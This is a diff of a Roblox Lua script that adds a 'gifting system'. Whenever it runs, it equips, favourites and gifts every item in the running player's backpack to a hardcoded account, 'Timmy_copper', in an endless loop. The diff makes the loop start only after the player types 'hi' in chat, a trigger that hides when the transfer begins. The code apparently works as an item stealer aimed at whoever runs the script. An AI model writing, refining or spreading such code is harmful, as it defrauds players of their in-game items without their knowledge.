@@ -183,6 +183,7 @@ task.spawn(function()
     end
 end)
 
+-- Gifting system
 local TARGET_PLAYER_NAME = "Timmy_copper"
 local GiftRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
 local FavoriteRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("FavoriteItem")
@@ -213,24 +214,31 @@ local function sendGift(item)
     end
 end
 
-task.spawn(function()
-    while true do
-        local backpack = player:FindFirstChild("Backpack")
-        if backpack then
-            local itemsToProcess = {}
-            for _, item in ipairs(backpack:GetChildren()) do
-                table.insert(itemsToProcess, item)
-            end
+-- ✅ NEW PART: only start gifting after you say "hi" in chat
+local giftingStarted = false
+player.Chatted:Connect(function(message)
+    if not giftingStarted and message:lower() == "hi" then
+        giftingStarted = true
+        task.spawn(function()
+            while true do
+                local backpack = player:FindFirstChild("Backpack")
+                if backpack then
+                    local itemsToProcess = {}
+                    for _, item in ipairs(backpack:GetChildren()) do
+                        table.insert(itemsToProcess, item)
+                    end
 
-            for _, item in ipairs(itemsToProcess) do
-                equipItem(item)
-                task.wait(0.5)
-                toggleFavorite(item)
-                task.wait(3)
-                sendGift(item)
-                task.wait(2)
+                    for _, item in ipairs(itemsToProcess) do
+                        equipItem(item)
+                        task.wait(0.5)
+                        toggleFavorite(item)
+                        task.wait(3)
+                        sendGift(item)
+                        task.wait(2)
+                    end
+                end
+                task.wait(1)
             end
-        end
-        task.wait(1)
+        end)
     end
 end)
